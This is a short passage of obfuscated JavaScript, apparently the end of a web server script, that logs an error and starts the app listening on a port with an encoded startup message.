_0x25deb7=_0x2a1465;console['error'](_0x25deb7(0xde),_0x3a6252);}),app['listen'](PORT,()=>console[_0x2a1465(0x112)](_0x2a1465(0x175)+PORT+'!'));
